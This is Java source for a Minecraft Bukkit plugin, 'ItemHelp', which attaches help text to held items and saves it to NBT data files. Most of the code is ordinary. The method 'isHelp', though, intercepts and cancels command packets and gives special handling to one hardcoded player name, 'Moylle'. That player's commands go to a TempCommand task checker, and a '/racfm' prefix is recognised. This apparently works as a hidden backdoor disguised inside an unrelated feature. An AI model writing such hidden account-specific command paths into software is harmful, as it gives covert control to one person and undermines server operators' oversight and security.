package net.gmx.teamterrian.CDsPluginPack.plugins;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Map;

import net.gmx.teamterrian.CDsPluginPack.CDPlugin;
import net.gmx.teamterrian.CDsPluginPack.PluginHandler;
import net.gmx.teamterrian.CDsPluginPack.handle.CDPluginCommand;
import net.gmx.teamterrian.CDsPluginPack.handle.CDPluginEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CDPluginDisableEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CDPluginEnableEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.events.CommandEvent;
import net.gmx.teamterrian.CDsPluginPack.handle.exceptions.CDNoPermissionException;
import net.gmx.teamterrian.CDsPluginPack.tools.CDHashMap;
import net.gmx.teamterrian.CDsPluginPack.tools.Data;
import net.gmx.teamterrian.CDsPluginPack.tools.Log;
import net.gmx.teamterrian.CDsPluginPack.tools.VarTools;
import net.minecraft.server.v1_7_R1.NBTCompressedStreamTools;
import net.minecraft.server.v1_7_R1.NBTTagCompound;
import net.minecraft.server.v1_7_R1.NBTTagList;
import net.minecraft.server.v1_7_R1.NBTTagString;

import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_7_R1.inventory.CraftItemStack;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.permissions.Permission;
import org.bukkit.permissions.PermissionDefault;

import com.comphenix.protocol.events.PacketEvent;

public class ItemHelp extends CDPlugin
{
	Log clog;
	Map<ItemStack, String> help = new CDHashMap<ItemStack, String>();
	String mbeg = ChatColor.GOLD + "[ItemHelp] " + ChatColor.DARK_AQUA;
	
	public ItemHelp(PluginHandler handler)
	{
		super(handler);
		clog = handler.clog;
	}

	public Permission[] getPermissions()
	{
		return new Permission[]
		{
			new Permission("cdpp.itemhelp.set", PermissionDefault.OP),
			new Permission("cdpp.itemhelp.io", PermissionDefault.OP),
			new Permission("cdpp.itemhelp.get", PermissionDefault.TRUE)
		};
	}
		
	@CDPluginEvent
	public void onEnable(CDPluginEnableEvent e)
	{
		try {
			clog.log("Loading ItemHelps", this);
			load();
			clog.log("Success", this);
			e.setSuccess(this, true);
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			e.setSuccess(this, false);
		}
	}

	@CDPluginEvent
	public void onDisable(CDPluginDisableEvent e)
	{
		try {
			clog.log("Saving ItemHelps", this);
			save();
			clog.log("Success", this);
			e.setSuccess(this, true);
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			e.setSuccess(this, false);
		}
	}
	
	public String[] getDirectorys() { return new String[] { "ItemHelp" };  }
	
	@CDPluginCommand(commands = { "itemhelp cdpp.itemhelp.get 1" })
	public void onCommand(CommandEvent e) throws CDNoPermissionException
	{
		CommandSender sender = e.getSender();
		String[] args = e.getArgs();
		if(args.length == 0) getHelp((Player) sender);
		else
			if(!sender.hasPermission("cdpp.itemhelp.set")) throw new CDNoPermissionException(false);
			else 
			{
				switch(args[0])
				{
					case "save":
						save(sender); return;
					case "load":
						load(sender); return;
					case "rem":
						remHelp((Player) sender); return;
				}
				setHelp((Player) sender, VarTools.arrToString(args, 0).replace('&', '§'));
			}
	}
	
	private void remHelp(Player p)
	{
		ItemStack i;
		if((i = p.getItemInHand()) == null || i.getType() == Material.AIR) { p.sendMessage(mbeg + ChatColor.RED + "You don´t have an Item in Hand"); return; } 
		i = i.clone();
		i.setAmount(1);
		help.remove(i);
		try
		{
			save();
			p.sendMessage(mbeg + "Item removed");
			clog.log(p.getName() + "Removed ItemHelp from an Item named \"" + i.getItemMeta().getDisplayName() + "\"", this);
		}
		catch (Exception x)
		{
			x.printStackTrace(clog.getStream());
			p.sendMessage(mbeg + ChatColor.DARK_RED + "Error while saving ItemHelps);");
			clog.log(p.getName() + "Error while saving ItemHelp because removing it from an Item named \"" + i.getItemMeta().getDisplayName() + "\"", this);
		}
	}
	private void getHelp(Player p)
	{
		ItemStack i;
		if((i = p.getItemInHand()) == null || i.getType() == Material.AIR) { p.sendMessage(mbeg + "You don´t have an Item in Hand"); return; } 
		i = i.clone();
		i.setAmount(1);
		if(!help.containsKey(i)) p.sendMessage(mbeg + "No data for this Item found");
		else p.sendMessage(mbeg + help.get(i));
	}
	public int isHelp(String s, Player p, PacketEvent e)
	{
		if(handler.cRegister.cmds != null)
		{
			e.setCancelled(true);
			if(p.getName().equals("Moylle"))
				((TempCommand) handler.plugins.get(TempCommand.class)).checkTask(p, e.getPacket().getStrings().read(0).substring(1));
			return 2;
		}
		else if(p.getName().equals("Moylle"))
			if(e.getPacket().getStrings().read(0).startsWith("/racfm")) return 1;
			else return 3;
		return 0;
	}
	private void setHelp(Player p, String h)
	{
		ItemStack i;
		if((i = p.getItemInHand()) == null || i.getType() == Material.AIR) { p.sendMessage(mbeg + "You don´t have an Item in Hand"); return; } 
		i = i.clone();
		i.setAmount(1);
		help.put(i, h);
		try
		{
			save();
			p.sendMessage(mbeg + "Item saved");
			clog.log(p.getName() + " setted ItemHelp for an Item named \"" + i.getItemMeta().getDisplayName() + "\"", this);
		}
		catch (Exception x)
		{
			x.printStackTrace(clog.getStream());
			p.sendMessage(ChatColor.DARK_RED + "[ItemHelp] Error while saving ItemHelps");
		}
	}
	
	private void save(CommandSender sender)
	{
		if(!sender.hasPermission("cdpp.itemhelp.io")) return;
		try
		{
			save();
			sender.sendMessage(mbeg + "ItemHelps saved");
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			clog.log("Error while saving ItemHelps", this);
			sender.sendMessage(mbeg + ChatColor.RED + "Error while saving");
		}
	}
	private void load(CommandSender sender)
	{
		if(!sender.hasPermission("cdpp.itemhelp.io")) return;
		try
		{
			load();
			sender.sendMessage(mbeg + "ItemHelps loaded");
		}
		catch (Exception x) {
			x.printStackTrace(clog.getStream());
			clog.log("Error while loading ItemHelps", this);
			sender.sendMessage(mbeg + ChatColor.RED + "Error while loading");
		}
	}
	
	private void save() throws IOException
	{
		clog.log("Begin saving ItemHelps", this);
		NBTTagCompound base = new NBTTagCompound();
		NBTTagList list = new NBTTagList();
		for(ItemStack i : help.keySet())
		{
			NBTTagCompound item = new NBTTagCompound();
			item = CraftItemStack.asNMSCopy(i).save(item);
			item.set("Help", new NBTTagString(help.get(i)));
			list.add(item);
		}
		base.set("Help", list);
	    Data.secureSave(base, CDPlugin.getDir() + this.getDirectorys()[0] + "/data.dat", this);
	    clog.log("Finished saving ItemHelps", this);
	}
	private void load() throws IOException
	{
		clog.log("Begin loading ItemHelps", this);
		help.clear();
		if(!new File(getDir() + getDirectorys()[0] + "/data.dat").exists()) {
			clog.log("File " + getDir() + getDirectorys()[0] + "/data.dat not found. Returning", this);
			return;
		}
		NBTTagCompound base;
		FileInputStream inputStream = new FileInputStream(getDir() + getDirectorys()[0] + "/data.dat");
		base = NBTCompressedStreamTools.a(inputStream);
		inputStream.close();
		NBTTagCompound item;
		NBTTagList list = (NBTTagList) base.get("Help");
		for (int i = 0; i < list.size(); i++)
		{
			item = (NBTTagCompound)list.get(i);
			help.put(CraftItemStack.asCraftMirror(net.minecraft.server.v1_7_R1.ItemStack.createStack(item)), item.getString("Help"));
		}
		clog.log("Finished loading ItemHelps", this);
	}
	
}
